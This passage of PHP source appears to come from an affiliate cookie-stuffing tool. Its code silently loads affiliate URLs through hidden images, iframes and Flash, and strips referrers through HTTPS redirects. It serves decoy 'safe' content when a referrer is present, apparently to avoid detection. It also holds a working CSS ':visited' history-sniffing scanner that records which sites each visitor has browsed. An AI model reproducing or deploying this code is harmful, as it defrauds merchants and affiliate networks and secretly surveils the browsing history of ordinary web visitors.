$a=$a . $word . $zz; $word='|'; } } if ($a) { $row['affiliateurl']=$a; } } } else if ($x['sequence']==1 || $x['sequence']==2) { if (sizeof($x['urls'])) { $x['pos']=$global_pos; $row['affiliateurl']=$x['urls'][$x['pos']]; if ($row['affiliateurl']=='http://' || $row['affiliateurl']=='https://') { $row['affiliateurl']=''; } } } } } if (sizeof($doupdate)) { $ddd=array('status'=>$doupdate[0]); if ($update_affiliateurl) { $ddd['affiliateurl']=$affiliateurl; } db_update_data($ddd,"itemid='{$doupdate[1]}'",'log'); } if (isset($advanced['flashcookiename']) && $advanced['flashcookiename']) { $use_flash_cookies=1; } if ($advanced!==FALSE) { if (isset($advanced['blank_ref_ua']) && $advanced['blank_ref_ua']) { $temp=explode('|',$advanced['blank_ref_ua']); if (sizeof($temp)) { foreach ($temp as $zz) { if ($zz) { if (strpos($ua,$zz)!==FALSE) { $can_use_https_redirect=1; break; } } } } } else { $can_use_https_redirect=1; } if (isset($advanced['blank_ref_stuffing']) && $advanced['blank_ref_stuffing']) { $blank_ref_stuffing=1; } else { $blank_ref_stuffing=0; } if (isset($advanced['blank_ref_nostuffing']) && $advanced['blank_ref_nostuffing']) { $blank_ref_nostuffing=1; } else { $blank_ref_nostuffing=0; } if (isset($advanced['blank_ref_click']) && $advanced['blank_ref_click']) { $blank_ref_click=1; } else { $blank_ref_click=0; } } $flag=0; if ($stuffing && $blank_ref_stuffing) { $flag=1; } else if (!$stuffing && $blank_ref_nostuffing) { $flag=1; } else if ($blank_ref_click) { $flag=1; } if ($can_use_https_redirect && $flag) { if (isset($advanced['checkblank'])) { $checkblank=$advanced['checkblank']; } else { $checkblank=0; } if ($blank_ref_nostuffing) { $row['nostuff_imagedest']=https_redirect($row['nostuff_imagedest'],$checkblank,$row['safe_imagedest']); $row['nostuff_imageurl']=https_redirect($row['nostuff_imageurl'],$checkblank,$row['safe_imageurl']); } if ($blank_ref_stuffing) { $row['stuff_imagedest']=https_redirect($row['stuff_imagedest'],$checkblank,$row['safe_imagedest']); $row['stuff_imageurl']=https_redirect($row['stuff_imageurl'],$checkblank,$row['safe_imageurl']); $row['affiliateurl']=https_redirect($row['affiliateurl'],$checkblank,''); } if ($blank_ref_click) { $row['nostuff_click']=https_redirectx($row['nostuff_click'],$checkblank,$row['safe_click']); $row['stuff_click']=https_redirectx($row['stuff_click'],$checkblank,$row['safe_click']); } } else if ($flag) { $row['nostuff_imagedest']=$row['safe_imagedest']; $row['nostuff_imageurl']=$row['safe_imageurl']; $row['nostuff_click']=$row['safe_click']; $row['stuff_imageurl']=$row['safe_imageurl']; $row['stuff_imagedest']=$row['safe_imagedest']; $row['stuff_click']=$row['safe_click']; $row['affiliateurl']=''; } $ar=array('stuff_imageurl','stuff_imagedest','affiliateurl','nostuff_imageurl','nostuff_imagedest','safe_imageurl','safe_imagedest'); foreach ($ar as $z) { if ($row[$z]=='http://' || $row[$z]=='https://') { $row[$z]=''; } } if ($row['mode']==2) { $row['stuff_imageurl']=''; $row['stuff_imagedest']=''; $row['stuff_click']=''; $row['nostuff_imageurl']=''; $row['nostuff_imagedest']=''; $row['nostuff_click']=''; $row['safe_imageurl']=''; $row['safe_imagedest']=''; $row['safe_click']=''; } $length=(((60*60)*24)*1500); if ($advanced['flashcookielength']!=='' && $advanced['flashcookielength']>0) { $length=$advanced['flashcookielength']*86400; } $length=time()+$length; $timedelay=0; if ($advanced['timedelay']) { $d=$advanced['timedelay']; if (strpos($d,'-')!==FALSE) { $x=explode('-',$d); $d=0; if (sizeof($x)>1) { if ($x[0]<$x[1]) { $d=(int)(rand($x[0],$x[1])); } } } if ($d) { $timedelay=$d; } } if ($advanced['iframe']) { $remote=get_remote_custom_referrer(); if ($remote) { $remote=encode($remote); } } else { $remote=''; } $encoded="amk398eu" . encode($row['stuff_imageurl']) . '|' . encode($row['stuff_imagedest']) . '|' . encode($use_flash_cookies) . '|' . encode($files) . '|' . encode($row['affiliateurl']) . '|' . encode($advanced['flashcookiename']) . '|' . encode($row['nostuff_imageurl']) . '|' . encode($row['nostuff_imagedest']) . '|' . encode($usesafe) . '|' . encode($row['safe_imageurl']) . '|' . encode($row['safe_imagedest']) . '|' . encode($row['type']) . '|' . encode($redir) . '|' . encode($finallookup) . '|' . encode($status) . '|' . encode($row['stuff_click']) . '|' . encode($row['nostuff_click']) . '|' . encode($row['safe_click']) . '|' . encode($advanced['clickable']) . '|' . encode($length) . '|' . encode($timedelay) . '|' . $remote; $encoded=utf8_encode($encoded); echo $encoded; global $testing_ip; if ($testing_ip) { file_put_contents('ip.txt',''); } } function get_default_html() { global $advanced,$path; $html=file_get_contents($path . "redirect.html"); if ($html!==FALSE) { $url=$advanced['redirecturl']; $min=$advanced['minseconds']; $html=str_replace('{url}',$url,$html); $html=str_replace('{URL}',$url,$html); $html=str_replace('{DELAY}',sprintf("%01d",$min),$html); $html=str_replace('{delay}',sprintf("%01d",$min),$html); } else { $html=''; } return($html); } function a6() { global $folders,$advanced,$row,$_SERVER,$campaignid,$campaignid2,$path; $source=file_get_contents($path . "redir.html"); if ($source!==FALSE) { $url=$advanced['redirecturl']; $min=$advanced['minseconds']; $width=$advanced['htmlwidth']; $height=$advanced['htmlheight']; if (!$width) { $width='1'; } if (!$height) { $height='1'; } if ($min==='') { $min=100000; } $source=str_replace('{DESTURL}',$url,$source); $source=str_replace('{MIN}',$min,$source); $base=stripback($_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'],'/'); if (substr($base,strlen($base)-1,1)=='/') { $base=substr($base,0,strlen($base)-1); } $base=stripback($base,'/'); if (substr($base,strlen($base)-1,1)=='/') { $base=substr($base,0,strlen($base)-1); } $source=str_replace('[base]',$base,$source); $source=str_replace('[files]',$folders['files'],$source); $source=str_replace('[campaignid]',$campaignid,$source); $source=str_replace('[width]',$width,$source); $source=str_replace('[height]',$height,$source); header("Cache-Control: no-cache, no-store, max-age=0, s-maxage=0, must-revalidate"); header("Cache-Control: post-check=0, pre-check=0", false ); header("Expires: Mon, 26 Jul 1997 05:00:00 GMT"); header("Pragma: no-cache"); echo $source; } else { if ($advanced['redirecturl']) { header("Cache-Control: no-cache, no-store, max-age=0, s-maxage=0, must-revalidate"); header("Cache-Control: post-check=0, pre-check=0", false ); header("Expires: Mon, 26 Jul 1997 05:00:00 GMT"); header("Pragma: no-cache"); header("Location: " . $advanced['redirecturl']); } } } function a7() { global $httphost,$phpself,$campaignid,$campaignid,$id,$db_num,$db_result,$_SERVER,$row; $x='http://' . $httphost . $phpself; if ($id==7) { $x=str_replace('index.php','meta2/' . $campaignid,$x); } else if ($id==8) { $x=str_replace('index.php','meta3/' . $campaignid,$x); } else { $md5=md5(strtolower($_SERVER['HTTP_USER_AGENT']) . $_SERVER['REMOTE_ADDR'] . $campaignid); $status=2; if (db_get_data('status','access',"md5='$md5'")) { if ($db_num) { $row2 = mysql_fetch_array($db_result,MYSQL_ASSOC); $status=$row2['status']; } } if ($status==0) { $desturl=$row['stuff_imagedest']; } else if ($status==1) { $desturl=$row['nostuff_imagedest']; } else { $desturl=$row['safe_imagedest']; } if (!$_SERVER['HTTP_REFERER']) { $x=$desturl; } else { $x=$row['safe_imagedest']; } header("Location: $x"); return(0); } echo '<html><head><meta http-equiv="refresh" content="0; url=' . $x . '"></head><body></body></html>'; } function output_flash_banner() { global $flash,$path,$row,$campaignid,$global_pos; $advanced=unserialize($row['advanced']); $url=''; if ($advanced!==FALSE && $advanced['custom2'] && !$advanced['iframe']) { $a=explode('|',$advanced['custom2']); if ($advanced['custom2sequence']==1) { if (!isset($advanced['custom2pos'])) { $advanced['custom2pos']=0; } if ($advanced['custom2pos']>=sizeof($a)) { $advanced['custom2pos']=0; } $url=$a[$advanced['custom2pos']]; $advanced['custom2pos']++; db_update_data(array('advanced'=>serialize($advanced)),"campaignid='$campaignid'",'campaigns'); } else if ($advanced['custom2sequence']==2) { $rand=(int)(rand(0,sizeof($a)-1)); $url=$a[$rand]; } else { $x=unserialize($row['affiliateurl']); if ($x!==FALSE) { if ($x['sequence']==1 || $x['sequence']==2) { get_access(); $pos=$global_pos; if (isset($a[$pos])) { $url=$a[$pos]; } } } } if ($url) { $url="http://{$url}"; } } if ($url) { $pos=strpos($url,'[random:'); if ($pos!==FALSE) { $pos2=strpos($url,']',$pos); if ($pos2!==FALSE) { $flag=1; if (strpos(substr($url,$pos+8,$pos2-($pos+8)),'-')!==FALSE) { $x=explode('-',substr($url,$pos+8,$pos2-($pos+8))); if (sizeof($x)==2) { $number1=sprintf("%01d",$x[0]); $number2=sprintf("%01d",$x[1]); if ($number1==$x[0] && $number2==$x[1]) { $xx=(int)(rand($x[0],$x[1])); $rep=sprintf("%01d",$xx); $pos2++; $url=substr_replace($url,$rep,$pos,$pos2-$pos); $flag=0; } } } if ($flag) { $x=explode(',',substr($url,$pos+8,$pos2-($pos+8))); if (sizeof($x)) { $rep=$x[rand(0,sizeof($x)-1)]; $pos2++; $url=substr_replace($url,$rep,$pos,$pos2-$pos); } } } } header("Location: $url"); } else { header("Cache-Control: no-cache, no-store, max-age=0, s-maxage=0, must-revalidate"); header("Cache-Control: post-check=0, pre-check=0", false ); header("Expires: Mon, 26 Jul 1997 05:00:00 GMT"); header("Pragma: no-cache"); header('Content-type: application/x-shockwave-flash'); $x=file_get_contents($path . $flash); if ($x===FALSE) { $x=''; } echo $x; } } function get_remote_custom_referrer() { global $row,$global_pos,$row222,$campaignid; $advanced=unserialize($row['advanced']); $url=''; if ($advanced!==FALSE && $advanced['custom2']) { $a=explode('|',$advanced['custom2']); if ($advanced['custom2sequence']==1) { if (!isset($advanced['custom2pos'])) { $advanced['custom2pos']=0; } if ($advanced['custom2pos']>=sizeof($a)) { $advanced['custom2pos']=0; } $url=$a[$advanced['custom2pos']]; $advanced['custom2pos']++; db_update_data(array('advanced'=>serialize($advanced)),"campaignid='$campaignid'",'campaigns'); } else if ($advanced['custom2sequence']==2) { $rand=(int)(rand(0,sizeof($a)-1)); $url=$a[$rand]; } else { $x=unserialize($row222['affiliateurl']); if ($x!==FALSE) { if ($x['sequence']==1 || $x['sequence']==2) { get_access(); $pos=$global_pos; if (isset($a[$pos])) { $url=$a[$pos]; } } } } if ($url) { $url="http://{$url}"; } } if ($url) { $pos=strpos($url,'[random:'); if ($pos!==FALSE) { $pos2=strpos($url,']',$pos); if ($pos2!==FALSE) { $flag=1; if (strpos(substr($url,$pos+8,$pos2-($pos+8)),'-')!==FALSE) { $x=explode('-',substr($url,$pos+8,$pos2-($pos+8))); if (sizeof($x)==2) { $number1=sprintf("%01d",$x[0]); $number2=sprintf("%01d",$x[1]); if ($number1==$x[0] && $number2==$x[1]) { $xx=(int)(rand($x[0],$x[1])); $rep=sprintf("%01d",$xx); $pos2++; $url=substr_replace($url,$rep,$pos,$pos2-$pos); $flag=0; } } } if ($flag) { $x=explode(',',substr($url,$pos+8,$pos2-($pos+8))); if (sizeof($x)) { $rep=$x[rand(0,sizeof($x)-1)]; $pos2++; $url=substr_replace($url,$rep,$pos,$pos2-$pos); } } } } } return($url); } function a10() { global $db_num,$db_result,$campaignid; if (db_get_data('data','counter',"itemid='$campaignid'")) { if ($db_num) { $row = mysql_fetch_array($db_result,MYSQL_ASSOC); $x=unserialize($row['data']); if ($x!==FALSE) { display_counter($x); return(0); } } } dot(); } function dot() { header('Content-type: image/gif'); echo "\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\xFF\xFF\xFF\x00\x00\x00\x21\xF9\x04\x01\x00\x00\x00\x00\x2C\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3B"; } function display_counter($x) { global $folders; $fill=0; if ($x['image_filename']) { $filename="../" . $folders['counter'] . "/" . $x['image_filename']; if (substr($filename,strlen($filename)-4,4)=='.png') { $im = imagecreatefrompng($filename); } else if (substr($filename,strlen($filename)-4,4)=='.gif') { $im = imagecreatefromgif($filename); } else if (substr($filename,strlen($filename)-5,5)=='.jpeg') { $im = imagecreatefromjpeg($filename); } else if (substr($filename,strlen($filename)-4,4)=='.jpg') { $im = imagecreatefromjpeg($filename); } else { dot(); return(0); } if ($im===FALSE) { dot(); return(0); } } else { $im = imagecreatetruecolor($x['image_width'], $x['image_height']); if ($im===FALSE) { dot(); return(0); } $fill=1; } $fore = imagecolorallocate($im, hexdec(substr($x['fore'],0,2)), hexdec(substr($x['fore'],2,2)), hexdec(substr($x['fore'],4,2))); $back = imagecolorallocate($im, hexdec(substr($x['back'],0,2)), hexdec(substr($x['back'],2,2)), hexdec(substr($x['back'],4,2))); if ($x['shadowcol']) { $shadowcol = imagecolorallocate($im, hexdec(substr($x['shadowcol'],0,2)), hexdec(substr($x['shadowcol'],2,2)), hexdec(substr($x['shadowcol'],4,2))); } if ($fill) { imagefilledrectangle($im, 0, 0, $x['image_width']-1, $x['image_height']-1, $back); } if (!$x['font_filename']) { $x['font_filename']='vera.ttf'; } $count=db_count_rows('log',"campaignid='{$x['id']}'"); if ($count==-1) { $count=0; } else { $count=$count+$x['base']; } $count=sprintf("%0" . $x['digits'] . "d",$count); if ($x['shadowcol']) { imagettftext($im, $x['size'], 0, $x['x']+1, $x['y']+1, $shadowcol, $x['font_filename'], $count); } imagettftext($im, $x['size'], 0, $x['x'], $x['y'], $fore, $x['font_filename'], $count); header('Content-type: image/png'); header("Cache-Control: no-cache, no-store, max-age=0, s-maxage=0, must-revalidate"); header("Cache-Control: post-check=0, pre-check=0", false ); header("Expires: Mon, 26 Jul 1997 05:00:00 GMT"); header("Pragma: no-cache"); imagepng($im); imagedestroy($im); } function do_custom($campaignid,$a,$url) { global $advanced,$row,$global_pos2; $url=str_replace("index.php","{$campaignid}.{$a}",$url); $a=explode('|',$advanced['custom']); $base=stripback($_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'],'/'); if (substr($base,strlen($base)-1,1)=='/') { $base=substr($base,0,strlen($base)-1); } $base=stripback($base,'/'); if (substr($base,strlen($base)-1,1)=='/') { $base=substr($base,0,strlen($base)-1); } $base='http://' . $base . '/'; if ($advanced['custom']) { if ($advanced['customsequence']==1) { if (!isset($advanced['custompos'])) { $advanced['custompos']=0; } if ($advanced['custompos']>=sizeof($a)) { $advanced['custompos']=0; } $url=$base . $a[$advanced['custompos']]; $advanced['custompos']++; db_update_data(array('advanced'=>serialize($advanced)),"campaignid='$campaignid'",'campaigns'); } else if ($advanced['customsequence']==2) { $rand=(int)(rand(0,sizeof($a)-1)); $url=$base . $a[$rand]; } else { $x=unserialize($row['affiliateurl']); if ($x!==FALSE) { if ($x['sequence']==1 || $x['sequence']==2) { $pos=$global_pos2; if (isset($a[$pos])) { $url=$base . $a[$pos]; } } } } } return($url); } function get_subfolders() { global $_SERVER; $ret=0; $a=$_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF']; $pos=strpos($a,'/'); if ($pos!==FALSE) { $a=substr($a,$pos+1); $ret=0; $len=strlen($a); $i=0; while ($i<$len) { if (substr($a,$i++,1)=='/') { $ret++; } } if ($ret) { $ret--; } else { $ret=0; } } return($ret); } function a11() { global $campaignid,$db_num,$db_result,$ip,$_GET; $image=decode($_GET['imagex']); $ip_int=convert_ip($ip,'to_int'); $time=time()-30; $where="ip='{$ip_int}' AND campaignid='{$campaignid}' AND status='1'"; if (db_get_data('itemid,timestamp','log',$where,'<timestamp',0,1)) { if ($db_num) { $row = mysql_fetch_array($db_result,MYSQL_ASSOC); if ($row['timestamp']>$time) { db_update_data(array('status'=>34),"itemid='{$row['itemid']}'",'log'); } } } header("Cache-Control: no-cache, no-store, max-age=0, s-maxage=0, must-revalidate"); header("Cache-Control: post-check=0, pre-check=0", false ); header("Expires: Mon, 26 Jul 1997 05:00:00 GMT"); header("Pragma: no-cache"); header("Location: {$image}"); } function a20() { global $_GET,$db_result,$db_num,$campaignid,$_SERVER,$testing_ip; $return=1000000; if ($testing_ip) { if (file_exists('ip.txt')) { $ip=file_get_contents('ip.txt'); } } else { $ip=decode4b($_GET['ip']); } if (!$ip) { $ip=decode4($_GET['ip']); } $ip=convert_ip($ip,'to_int'); if (db_get_data('timestamp,campaignid','log',"ip='$ip'",'<timestamp',0,1)) { if ($db_num) { $row = mysql_fetch_array($db_result,MYSQL_ASSOC); $return=time()-$row['timestamp']; if (db_get_data('advanced','campaigns',"campaignid='{$row['campaignid']}'")) { if ($db_num) { $row2 = mysql_fetch_array($db_result,MYSQL_ASSOC); $x=unserialize($row2['advanced']); if ($x!==FALSE) { if ($x['timedelay']) { $timedelay=0; if (strpos($x['timedelay'],'-')!==FALSE) { $xx=explode('-',$x['timedelay']); $timedelay=$xx[1]; } else { $timedelay=$x['timedelay']; } $return=$return-$timedelay; if ($return<0) { if ($return>=(0-$timedelay)) { $return='0'; } } } } } } if ($return<0) { $return=1000000; } } } echo $return; } function xa20() { global $_GET,$db_result,$db_num,$campaignid,$_SERVER; $return=1000000; $ref=decode4($_GET['ref']); $ref2=decode4($_GET['ref2']); $ip=decode4($_GET['ip']); $md5=md5($ref); if ($md5) { if (!$campaignid) { if (db_get_data('campaignid','custom2',"ref='$md5'")) { if ($db_num) { $word=''; $x=''; while ($row = mysql_fetch_array($db_result,MYSQL_ASSOC)) { $x=$x . $word . "campaignid='{$row['campaignid']}'"; $word=' OR '; } if ($x) { if (db_get_data('campaignid,landingpage','campaigns',$x)) { if ($db_num) { while ($row = mysql_fetch_array($db_result,MYSQL_ASSOC)) { if (strpos(strtolower($ref2),strtolower($row['landingpage']))!==FALSE) { $campaignid=$row['campaignid']; break; } } } } } } } } if ($campaignid>0) { $ip2=convert_ip($ip,'to_int'); if (db_get_data('timestamp','log',"ip='$ip2' AND campaignid='$campaignid'",'<itemid',0,1)) { if ($db_num) { $row = mysql_fetch_array($db_result,MYSQL_ASSOC); $return=time()-$row['timestamp']; if ($return<0) { $return=1000000; } } } } } echo $return; } function encode_create_array4() { global $encode_array4,$encode_array24; $char=0; $c1=ord('t'); $c2=ord('i'); $encode_array4=array(); $encode_array24=array(); while ($char<=255) { $encode_array4[$char]=chr($c1) . chr($c2); $encode_array24[chr($c1) . chr($c2)]=$char++; $c2++; if ($c2>ord('z')) { $c2=ord('a'); $c1++; if ($c1>ord('z')) { $c1=ord('a'); } } } } function encode4($text) { global $encode_array4; if ((!isset($encode_array4)) || (sizeof($encode_array4)!=256)) { encode_create_array4(); } if ((!isset($encode_array4)) || (sizeof($encode_array4)!=256)) { return(FALSE); } else { $len=strlen($text); $i=0; $ret=''; while ($i<$len) { $char=ord(substr($text,$i++,1)); if ($char>=0 && $char<=255) { $ret=$ret . $encode_array4[$char]; } else { return(FALSE); } } return($ret); } } function decode4($text) { global $encode_array24; if ((!isset($encode_array24)) || (sizeof($encode_array24)!=256)) { encode_create_array4(); } if ((!isset($encode_array24)) || (sizeof($encode_array24)!=256)) { return(FALSE); } else { $len=strlen($text); if ($len % 2) { return(FALSE); } else { $i=0; $ret=''; while ($i<$len) { $char=substr($text,$i,2); $i=$i+2; if (isset($encode_array24[$char])) { $ret=$ret . chr($encode_array24[$char]); } else { return(FALSE); } } return($ret); } } } function encode_create_array4b() { global $encode_array4b,$encode_array24b; $char=0; $c1=ord('a'); $c2=ord('a'); $encode_array4b=array(); $encode_array24b=array(); while ($char<=255) { $encode_array4b[$char]=chr($c1) . chr($c2); $encode_array24b[chr($c1) . chr($c2)]=$char++; $c2++; if ($c2>ord('z')) { $c2=ord('a'); $c1++; if ($c1>ord('z')) { $c1=ord('a'); } } } } function encode4b($text) { global $encode_array4b; if ((!isset($encode_array4b)) || (sizeof($encode_array4b)!=256)) { encode_create_array4b(); } if ((!isset($encode_array4b)) || (sizeof($encode_array4b)!=256)) { return(FALSE); } else { $len=strlen($text); $i=0; $ret=''; while ($i<$len) { $char=ord(substr($text,$i++,1)); if ($char>=0 && $char<=255) { $ret=$ret . $encode_array4b[$char]; } else { return(FALSE); } } return($ret); } } function decode4b($text) { global $encode_array24b; if ((!isset($encode_array24b)) || (sizeof($encode_array24b)!=256)) { encode_create_array4b(); } if ((!isset($encode_array24b)) || (sizeof($encode_array24b)!=256)) { return(FALSE); } else { $len=strlen($text); if ($len % 2) { return(FALSE); } else { $i=0; $ret=''; while ($i<$len) { $char=substr($text,$i,2); $i=$i+2; if (isset($encode_array24b[$char])) { $ret=$ret . chr($encode_array24b[$char]); } else { return(FALSE); } } return($ret); } } } function a7log($text) { return(0); $x=file_get_contents('xxx.txt'); if ($x===FALSE) { $x=''; } $x=$x . "$text\r\n\r\n"; file_put_contents('xxx.txt',$x); } function a700() { global $action,$_COOKIE; if ($action=='scancss') { a700_scan9('css'); } else if ($action=='scanjs') { a700_scan9('js'); } if (isset($_COOKIE['stats'])) { echo "-"; exit; } if ($action=='scan') { a700_scan(); } else if ($action=='scan1') { a700_scan1(); } else if ($action=='scan3') { a700_scan3(); } else if ($action=='scan4') { a700_scan4(); } else if ($action=='scan5') { a700_scan5(); } exit; } function a700_scan9($type) { global $instructions2,$in_period,$in_list,$_SERVER,$folders,$css_links,$db_num,$db_result,$in_width,$in_height; if (!isset($in_list) || $in_list==='') { $in_list=0; } $html_var_instructions=$instructions2['css']; $html_var_instructions2=$instructions2['css2']; $base=stripback($_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'],'/'); if (substr($base,strlen($base)-1,1)=='/') { $base=substr($base,0,strlen($base)-1); } $base=stripback($base,'/'); if (substr($base,strlen($base)-1,1)=='/') { $base=substr($base,0,strlen($base)-1); } $html_var_instructions=str_replace('[base]',$base,$html_var_instructions); $html_var_instructions=str_replace('[list]',$in_list,$html_var_instructions); $html_var_instructions=str_replace('[files]',$folders['files'],$html_var_instructions); $html_var_instructions2=str_replace('[base]',$base,$html_var_instructions2); $html_var_instructions2=str_replace('[list]',$in_list,$html_var_instructions2); $html_var_instructions2=str_replace('[files]',$folders['files'],$html_var_instructions2); if ($type=='css') { if (!isset($in_period) || $in_period==='') { $links=$css_links; if (db_get_data('extra','settings2',"itemid='1'")) { if ($db_num) { $row = mysql_fetch_array($db_result,MYSQL_ASSOC); $xx=unserialize($row['extra']); if (isset($xx['css'])) { if ($xx['css']>0 && $xx['css']!=='') { $links=$xx['css']; } } } } $html_var_instructions=str_replace('[period]',(int)($links/7.5),$html_var_instructions); } else { $html_var_instructions=str_replace('[period]',$in_period,$html_var_instructions); } } if ($type=='css') { echo $html_var_instructions; } else { echo $html_var_instructions2; } } function a700_scan5() { global $in_list; $out=''; if ($in_list) { a7log("scan5: $in_list"); if (strpos($in_list,'|')!==FALSE) { $temp=explode('|',$in_list); $count=0; $html=''; foreach ($temp as $xx) { if ($xx) { $temp2=explode(',',$xx); if (sizeof($temp2)==2) { $cid=$temp2[0]; $itemid=$temp2[1]; db_update_data(array('count'=>'+1'),"itemid='$itemid'",'scan_urls'); $html=$html . gethtml($cid); $count++; } } } if ($count) { $out="$count|$html"; } } } if (!$out) { $out='x'; } a7log("scan5: output: $out"); echo $out; exit; } function drop_browser_history_stuffing_cookie() { global $db_num,$db_result,$css_period; if (db_get_data('extra','settings2',"itemid='1'")) { if ($db_num) { $row = mysql_fetch_array($db_result,MYSQL_ASSOC); $xx=unserialize($row['extra']); if (isset($xx['period'])) { $period=$xx['period']; } else { $period=$css_period; } $xxx_expire=time()+$period; setcookie('stats','1',$xxx_expire,'/'); } } } function a700_scan4() { global $in_md5,$in_external,$css_method,$db_result,$db_num,$_SERVER; if ($in_md5) { if ($css_method) { a7log("scan4: $in_md5"); $ip=convert_ip($_SERVER['REMOTE_ADDR'],'to_int'); if (db_get_data('md5','scan',"ip='$ip'")) { if ($db_num) { $row = mysql_fetch_array($db_result,MYSQL_ASSOC); $x=unserialize($row['md5']); if ($x===FALSE) { $x=array(); } $x[$in_md5]=$in_external; $x=serialize($x); db_update_data(array('md5'=>$x),"ip='$ip'",'scan'); } } } else { setcookie('css_' . $in_md5,$in_external,0,'/'); } } } function a700_scan3() { global $db_result,$db_num,$_SERVER,$folders,$css_method; $base=stripback($_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'],'/'); if (substr($base,strlen($base)-1,1)!='/') { $base=$base . '/'; } $base=$base . "index.php?id=700&action=scan4&in_md5="; $ip=convert_ip($_SERVER['REMOTE_ADDR'],'to_int'); if (db_get_data('toscan,md5','scan',"ip='$ip'")) { if ($db_num) { $out="<html><body>\r\n[CSS]"; $css="<style>\r\n"; $row = mysql_fetch_array($db_result,MYSQL_ASSOC); $x=unserialize($row['toscan']); if ($x!==FALSE && sizeof($x)) { $count=1; if (!$css_method) { setcookie('css_0',sizeof($x),0,'/'); a7log("scan3: setcookie css_0 to " . sizeof($x)); } else { $x2=unserialize($row['md5']); if ($x2===FALSE) { $x2=array(); } $x2[0]=sizeof($x); $x2=serialize($x2); db_update_data(array('md5'=>$x2),"ip='$ip'",'scan'); } foreach ($x as $zz) { $md5=md5($zz); $out=$out . "<a id=\"link{$count}\" href=\"{$zz}\">.</a>\r\n"; $css=$css . "#link{$count}:visited { background: url(http://{$base}{$md5}&in_external=1); }\r\n"; $css=$css . "#link{$count} { background: url(http://{$base}{$md5}&in_external=0); }\r\n"; $count++; } } $y=$count-1; a7log("scan3: displaying CSS, number of links in CSS=$y, CSS content:"); $css=$css . "</style>\r\n"; $out=str_replace('[CSS]',$css,$out); $out=$out . '</body></html>'; a7log($out); echo $out; } } } function a700_scan1() { global $_SERVER,$db_result,$db_num,$settings,$css_links,$in_list,$_COOKIE,$css_method; $x=array(); $cookies=array(); $num=0; $x2=array(); if (!$css_method) { foreach ($_COOKIE as $k=>$v) { if ($k=='css_0') { $num=$v; } else if (substr($k,0,4)=='css_') { if ($v) { $x[]=substr($k,4); } $cookies[]=$k; } } } else { $ip=convert_ip($_SERVER['REMOTE_ADDR'],'to_int'); if (db_get_data('md5','scan',"ip='$ip'")) { if ($db_num) { $row = mysql_fetch_array($db_result,MYSQL_ASSOC); $x2=unserialize($row['md5']); if ($x2!==FALSE) { if (isset($x2[0])) { $num=$x2[0]; } if (sizeof($x2)) { foreach ($x2 as $k=>$v) { if ($k) { if ($v) { $x[]=$k; } $cookies[]=$k; } } } } } } } a7log("scan1: in_list=$in_list, number of CSS URLs to scan=$num, number of css_ cookies=" . sizeof($cookies)); $where=''; if ($in_list>0 && $in_list!=='') { $where="list='$in_list'"; } if ($num && sizeof($cookies)>=$num) { $links=$css_links; if (db_get_data('extra','settings2',"itemid='1'")) { if ($db_num) { $row = mysql_fetch_array($db_result,MYSQL_ASSOC); $xx=unserialize($row['extra']); if (isset($xx['css'])) { if ($xx['css']>0 && $xx['css']!=='') { $links=$xx['css']; } } } } a7log("scan1: URLs per sequence=$links, add this to offset in scan table"); if (!$css_method) { $ip=convert_ip($_SERVER['REMOTE_ADDR'],'to_int'); db_update_data(array('offset'=>'+' . $links),"ip='$ip'",'scan'); $expire=time()-(((60*60)*24)*1000); foreach ($cookies as $zz) { a7log("scan1: erase cookie $zz"); setcookie($zz,'',$expire,'/'); } } else { if (sizeof($x2) && sizeof($cookies)) { foreach ($cookies as $zz) { unset($x2[$zz]); } db_update_data(array('md5'=>serialize($x2),'offset'=>'+' . $links),"ip='$ip'",'scan'); } else { $ip=convert_ip($_SERVER['REMOTE_ADDR'],'to_int'); db_update_data(array('offset'=>'+' . $links),"ip='$ip'",'scan'); } } if (db_get_data('itemid,md5,campaignid','scan_urls',$where)) { if ($db_num) { $campaigns=array(); while ($row = mysql_fetch_array($db_result,MYSQL_ASSOC)) { if (array_search($row['md5'],$x)!==FALSE) { $campaigns[$row['itemid']]=$row['campaignid']; } } if (sizeof($campaigns)) { $out=''; foreach ($campaigns as $itemid=>$campaignid) { db_update_data(array('count'=>'+1'),"itemid='$itemid'",'scan_urls'); $out=$out . $campaignid . '|' . gethtml($campaignid) . '||'; } } if (!$out) { $out='z'; a7log("scan1: echo z"); } else { a7log("scan1: echo campaign html"); a7log($out); } echo $out; exit; } } } a7log("scan1: echo x"); echo "x"; exit; } function a700_scan() { global $_SERVER,$db_result,$db_num,$settings,$css_links,$in_list,$_COOKIE,$in_md5,$css_links2,$css_method; $ts=time(); $ip=convert_ip($_SERVER['REMOTE_ADDR'],'to_int'); $x2=array(); if (db_get_data('offset,timestamp,md5','scan',"ip='$ip'")) { $offset=0; if ($db_num) { $row = mysql_fetch_array($db_result,MYSQL_ASSOC); $x2=unserialize($row['md5']); $offset=$row['offset']; if ($row['timestamp']>0) { if (($ts-$row['timestamp'])>((60*60)*24)) { db_update_data(array('offset'=>0,'timestamp'=>$ts,'toscan'=>serialize(array()),'md5'=>''),"ip='$ip'",'scan'); $offset=0; } } else { echo "2"; exit; } } else { db_insert_data(array('ip'=>$ip,'offset'=>0,'timestamp'=>$ts,'toscan'=>serialize(array()),'md5'=>''),'scan'); } a7log("scan: in_list=$in_list"); $where=''; if ($in_list>0 && $in_list!=='') { $where="list='$in_list'"; } $count=db_count_rows('scan_urls',$where); a7log("scan: count=$count, offset=$offset"); if ($count!=-1) { if ($offset>=$count) { db_delete_data("ip='$ip'",'scan'); if (!$css_method) { $expire=time()-(((60*60)*24)*1000); foreach ($_COOKIE as $k=>$v) { if (substr($k,0,4)=='css_') { setcookie($k,'',$expire,'/'); } } } drop_browser_history_stuffing_cookie(); a7log("scan: echo 0"); echo "0"; exit; } else { if ($in_md5) { $links=$css_links2; } else { $links=$css_links; } if (db_get_data('extra','settings2',"itemid='1'")) { if ($db_num) { $row = mysql_fetch_array($db_result,MYSQL_ASSOC); $x=unserialize($row['extra']); if (!$in_md5) { if (isset($x['css'])) { if ($x['css']>0 && $x['css']!=='') { $links=$x['css']; } } } else { if (isset($x['css2'])) { if ($x['css2']>0 && $x['css2']!=='') { $links=$x['css2']; } } } } } a7log("scan: number of links to get=$links"); 